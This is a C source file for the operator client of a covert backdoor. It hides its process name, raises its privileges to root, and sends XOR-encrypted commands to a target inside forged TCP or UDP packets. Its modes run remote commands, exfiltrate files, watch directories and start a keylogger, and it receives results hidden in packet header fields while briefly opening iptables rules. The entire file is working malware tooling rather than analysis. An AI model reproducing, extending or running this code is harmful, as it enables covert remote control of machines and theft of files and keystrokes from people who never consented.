#include <sys/prctl.h>
#include "config.h"
#include "raw_socket.h"

char d_iptables[STR_SIZE];

void recv_result_tcp(char* mode) {
    struct recv_tcp {
        struct iphdr ip;
        struct tcphdr tcp;
        char buffer[10000];
    } recv_tcp_pkt;

    char decryptedtext[MAX_SIZE], cipher[MAX_SIZE], cipher_content[MAX_SIZE];
    char tmp;
    memset(decryptedtext, 0, MAX_SIZE);
    memset(cipher, 0, MAX_SIZE);
    //read packet loop
     while(1) {
        if(strlen(cipher) > 3) {
            if(!strcmp(RESEND, &cipher[strlen(cipher)-3]))
                break;
        }
        //Open socket for reading
        int recv_socket = socket(AF_INET, SOCK_RAW, 6);
        if(recv_socket < 0) {
            perror("[-]Receive socket cannot be open. Are you root?\n");
            exit(1);
        }
        //Listen for return packet on a passive socket
        read(recv_socket, (struct recv_tcp *)&recv_tcp_pkt, 9999);

        if((recv_tcp_pkt.tcp.syn == 1) && (recv_tcp_pkt.ip.saddr == host_convert(TARGETIP))) {
            if(recv_tcp_pkt.ip.id == HEADERKEY) {
            	strncat(cipher, (const char*)&recv_tcp_pkt.tcp.source, MAX_SIZE - strlen(cipher));
                strncat(cipher, (const char*)&recv_tcp_pkt.tcp.seq, MAX_SIZE - strlen(cipher));
                strncat(cipher, (const char*)&recv_tcp_pkt.tcp.ack_seq, MAX_SIZE - strlen(cipher));
                strncat(cipher, (const char*)&recv_tcp_pkt.tcp.window, MAX_SIZE - strlen(cipher));
            }
        }
        close(recv_socket); //close the socket so we don't hose the kernel
    }//end while() read packet loop

    char *ptr, *ptr2;
    if (!(ptr = strstr(cipher, RETURN)))
        return;
    ptr += 4;
    if (!(ptr2 = strstr(ptr, RESEND)))
		return;

    //extract cyper length
    memset(cipher_content, 0, MAX_SIZE);
    strncpy(cipher_content, ptr, (ptr2 - ptr));
    encryptDecrypt(decryptedtext,cipher_content,XORKEY);
    printf("%s\n", decryptedtext);
    if(strcmp(mode,"file") == 0 || strcmp(mode,"watch") == 0)
    	file_write(decryptedtext);
    delete_rule();
}

void recv_result_udp(char* mode) {
    struct recv_udp {
        struct iphdr ip;
        struct udphdr udp;
        char buffer[10000];
    } recv_udp_pkt;

    char decryptedtext[MAX_SIZE], cipher[MAX_SIZE], cipher_content[MAX_SIZE];
    char tmp;
    memset(decryptedtext, 0, MAX_SIZE);
    memset(cipher, 0, MAX_SIZE);
    //read packet loop
     while(1) {
        if(strlen(cipher) > 3)
            if(!strcmp(RESEND, &cipher[strlen(cipher)-3]))
                break;
        //Open socket for reading
        int recv_socket = socket(AF_INET, SOCK_RAW,  IPPROTO_UDP);
        if(recv_socket < 0) {
            perror("[-]Receive socket cannot be open. Are you root?\n");
            exit(1);
        }
        //Listen for return packet on a passive socket
        read(recv_socket, (struct recv_udp *)&recv_udp_pkt, 9999);

        if(recv_udp_pkt.ip.saddr == host_convert(TARGETIP)) {
            if(recv_udp_pkt.ip.id == HEADERKEY) {
            	strncat(cipher, (const char*)&recv_udp_pkt.udp.source, MAX_SIZE - strlen(cipher));
            }
        }
        close(recv_socket); //close the socket so we don't hose the kernel
    }//end while() read packet loop

    char *ptr, *ptr2;
    if (!(ptr = strstr(cipher, RETURN)))
        return;
    ptr += 4;
    if (!(ptr2 = strstr(ptr, RESEND)))
        return;

    //extract cyper length
    memset(cipher_content, 0, MAX_SIZE);
    strncpy(cipher_content, ptr, (ptr2 - ptr));
    encryptDecrypt(decryptedtext,cipher_content,XORKEY);
    printf("%s\n", decryptedtext);
    if(strcmp(mode,"file") == 0 || strcmp(mode,"watch") == 0)
        file_write(decryptedtext);
    delete_rule();
}

void add_rule(char* sip, char* dport) {
    char iptables[STR_SIZE];
    memset(iptables, 0, STR_SIZE);
    if(strcmp("tcp", PROTOCOL) == 0) {
        strncpy(iptables, "iptables -A INPUT -p tcp -s ", STR_SIZE - strlen(iptables));
        strncat(iptables, sip, STR_SIZE - strlen(iptables));
        strncat(iptables, " --dport ", STR_SIZE - strlen(iptables));
        strncat(iptables, dport, STR_SIZE - strlen(iptables));
        strncat(iptables, " -j ACCEPT", STR_SIZE - strlen(iptables));

        memset(d_iptables, 0, STR_SIZE);
        strncpy(d_iptables, "iptables -D INPUT -p tcp -s ", STR_SIZE - strlen(iptables));
        strncat(d_iptables, sip, STR_SIZE - strlen(iptables));
        strncat(d_iptables, " --dport ", STR_SIZE - strlen(iptables));
        strncat(d_iptables, dport, STR_SIZE - strlen(iptables));
        strncat(d_iptables, " -j ACCEPT", STR_SIZE - strlen(iptables));
    } else if(strcmp("udp", PROTOCOL) == 0) {
        strncpy(iptables, "iptables -A INPUT -p udp -s ", STR_SIZE - strlen(iptables));
        strncat(iptables, sip, STR_SIZE - strlen(iptables));
        strncat(iptables, " --dport ", STR_SIZE - strlen(iptables));
        strncat(iptables, dport, STR_SIZE - strlen(iptables));
        strncat(iptables, " -j ACCEPT", STR_SIZE - strlen(iptables));

        memset(d_iptables, 0, STR_SIZE);
        strncpy(d_iptables, "iptables -D INPUT -p udp -s ", STR_SIZE - strlen(iptables));
        strncat(d_iptables, sip, STR_SIZE - strlen(iptables));
        strncat(d_iptables, " --dport ", STR_SIZE - strlen(iptables));
        strncat(d_iptables, dport, STR_SIZE - strlen(iptables));
        strncat(d_iptables, " -j ACCEPT", STR_SIZE - strlen(iptables));
    }
    printf("[+]Allowing access to port %s\n", dport);
    system(iptables);
}

void delete_rule() {
    system(d_iptables);
    printf("\n[+]Deleting firewall rule.\n");
    printf("[+]Ternimate the program.\n");
}

void file_write(char* content) {
    FILE *fp;
    char filename[100];
    int length = 0;
    // Read filename
    printf("\nEnter a new filename: ");
    if(fgets(filename, STR_SIZE, stdin) != NULL) {
        length = strlen(filename);
        if(length == STR_SIZE-1 && filename[length-1] != '\n') {
            fprintf(stderr,"[-]ERROE: Line overeached buffer!\n");
            exit(1);
        }
        if(filename[length-1] == '\n')
            filename[length-1] = '\0';
    }
    // Open file in write mode
    fp = fopen(filename, "w+");
    // If file opened successfully, then write the string to file
    if (fp) {
        printf("[+]Write to file %s\n", filename);
        fputs(content, fp);
    } else {
        printf("[-]Failed to open the file\n");
    }
    //Close the file
    fclose(fp);
}

int main(int argc,char **argv) {
    /* Tell them how to use this thing */
    if((argc !=3)) {
        usage(argv[0]);
        exit(0);
    }
    /* mask the process name */
    memset(argv[0], 0, strlen(argv[0]));	
    strcpy(argv[0], MASK);
    prctl(PR_SET_NAME, MASK, 0, 0);
    /* change the UID/GID to 0 (raise privs) */
    setuid(0);
    setgid(0);
    char cmd[STR_SIZE];
    memset(cmd, 0, strlen(cmd));
    int length = 0;
    char message[STR_SIZE], encrypted[STR_SIZE],send_message[STR_SIZE], try[STR_SIZE];
    char mode[10];
    memset(mode, 0, strlen(mode));
   
    if (strcmp(argv[1],"-mode") == 0) {
        if(strcmp(argv[2],"cmd") == 0) {
            printf("\n[+]Enter mode: command\n");
            strncat(mode, argv[2], strlen(argv[2]));
            printf("\nEnter command: ");
            // Get command from user input
            if(fgets(cmd, STR_SIZE, stdin) != NULL) {
                length = strlen(cmd);
                if(length == STR_SIZE-1 && cmd[length-1] != '\n') {
                    fprintf(stderr,"[-]ERROE: Line overeached buffer!\n");
                    return 1;
                }
                if(cmd[length-1] == '\n')
                    cmd[length-1] = '\0';
            }
            // Add header and footer to the command
            memset(message, 0, STR_SIZE);
            memset(encrypted, 0, STR_SIZE);
            memset(send_message, 0, STR_SIZE);
            //memset(try, 0, STR_SIZE);
            strncat(message, HEADER,STR_SIZE - strlen(message));
            strncat(message, cmd,STR_SIZE - strlen(message));
            strncat(message, FOOTER,STR_SIZE - strlen(message));
        } else if(strcmp(argv[2],"file") == 0) {
            printf("\n[+]Enter mode: file exfiltration\n");
            strncat(mode, argv[2], strlen(argv[2]));
            printf("\nEnter file path: ");
            // Get command from user input
            if(fgets(cmd, STR_SIZE , stdin) != NULL) {
                length = strlen(cmd);
                if(length == STR_SIZE-1 && cmd[length-1] != '\n') {
                    fprintf(stderr,"[-]ERROE: Line overeached buffer!\n");
                    return 1;
                }
                if(cmd[length-1] == '\n')
                    cmd[length-1] = '\0';
            }
            // Add header and footer to the command
            memset(message, 0, STR_SIZE);
            memset(encrypted, 0, STR_SIZE);
            memset(send_message, 0, STR_SIZE);
            //memset(try, 0, STR_SIZE);
            strncat(message, HEADER,STR_SIZE - strlen(message));
            strncat(message, "cat ",STR_SIZE - strlen(message)); //"cat test.txt"
            strncat(message, cmd,STR_SIZE - strlen(message));
            strncat(message, FOOTER,STR_SIZE - strlen(message));
            
        } else if(strcmp(argv[2],"keylogger") == 0) {
            printf("\n[+]Enter mode: keylogger\n");
            printf("\n[+]Sending command to start keylogger.\n");
            strncat(mode, argv[2], strlen(argv[2]));
            // Add header and footer to the command
            memset(message, 0, STR_SIZE);
            memset(encrypted, 0, STR_SIZE);
            memset(send_message, 0, STR_SIZE);
            //memset(try, 0, STR_SIZE);
            strncat(message, HEADER,STR_SIZE - strlen(message));
            strncat(message, "keylogger",STR_SIZE - strlen(message));
            strncat(message, FOOTER,STR_SIZE - strlen(message));
            
        } else if(strcmp(argv[2],"watch") == 0) {
            printf("\n[+]Enter mode: watch file creation\n");
            strncat(mode, argv[2], strlen(argv[2]));
            printf("\nEnter directory: ");
            // Get command from user input
            if(fgets(cmd, STR_SIZE, stdin) != NULL) {
                length = strlen(cmd);
                if(length == STR_SIZE-1 && cmd[length-1] != '\n') {
                    fprintf(stderr,"[-]ERROE: Line overeached buffer!\n");
                    return 1;
                }
                if(cmd[length-1] == '\n')
                    cmd[length-1] = '\0';
            }
            // Add header and footer to the command
            memset(message, 0, STR_SIZE);
            memset(encrypted, 0, STR_SIZE);
            memset(send_message, 0, STR_SIZE);
            memset(try, 0, STR_SIZE);
            strncat(message, HEADER, STR_SIZE - strlen(message));
            strncat(message, "inotify ", STR_SIZE - strlen(message)); // "inotify /home/lydia test.txt"
            strncat(message, cmd, STR_SIZE - strlen(message));
            strncat(message, " ", STR_SIZE - strlen(message));
            memset(cmd,0,STR_SIZE);
            printf("\nEnter filename: ");
            // Get command from user input
            if(fgets(cmd, STR_SIZE , stdin) != NULL) {
                length = strlen(cmd);
                if(length == STR_SIZE-1 && cmd[length-1] != '\n') {
                    fprintf(stderr,"[-]ERROE: Line overeached buffer!\n");
                    return 1;
                }
                if(cmd[length-1] == '\n')
                    cmd[length-1] = '\0';
            }
            strncat(message, cmd, STR_SIZE - strlen(message));
            strncat(message, FOOTER, STR_SIZE - strlen(message));
        } else if(strcmp(argv[2],"close") == 0) {
            printf("\n[+]Closing backdoor application.\n");
            strncat(mode, argv[2], strlen(argv[2]));
            // Add header and footer to the command
            memset(message, 0, STR_SIZE);
            memset(encrypted, 0, STR_SIZE);
            memset(send_message, 0, STR_SIZE);
            strncat(message, HEADER,STR_SIZE - strlen(message));
            strncat(message, "close",STR_SIZE - strlen(message));
            strncat(message, FOOTER,STR_SIZE - strlen(message));
        } else {
            printf("[-]ERROE: Wrong mode, terminating the program...\n");
            usage(argv[0]);
            exit(0);
        }
    }

    printf("[+]Encrypting message...\n");
    encryptDecrypt(encrypted, message, XORKEY);
    //encryptDecrypt(try, encrypted, XORKEY);
    strncat(send_message, encrypted, STR_SIZE - strlen(send_message));

    printf("[+]Sending message...\n");
    if(strcmp("tcp", PROTOCOL) == 0) {
        forgeTCP(send_message);
    } else if(strcmp("udp", PROTOCOL) == 0) {
        forgeUDP(send_message);
    }

    if (strcmp(argv[2],"keylogger") == 0) {
        return 0;
    } else if (strcmp(argv[2],"file") == 0 || strcmp(argv[2],"watch") == 0 || strcmp(argv[2],"cmd") == 0) {
        sniff_port_knocking();
        if(strcmp("tcp", PROTOCOL) == 0) {
            printf("[+]Receiving message...\n");
            recv_result_tcp(mode);
        } else if(strcmp("udp", PROTOCOL) == 0) {
            printf("[+]Receiving message...\n");
            recv_result_udp(mode);
        }
        return 0;
    }
}
/* Tell them how to use this */
void usage(char *progname) {
    printf("\n*******************************************\n");
    printf("Usage: \n%s -mode [cmd/file/watch/keylogger]\n\n", progname);
    printf("-mode cmd          - run command.\n");
    printf("-mode file         - get file by path.\n");
    printf("-mode watch        - monitor file creation.\n");
    printf("-mode keylogger    - start keylogger.\n\n");
    printf("-mode close        - close backdoor application.\n");
}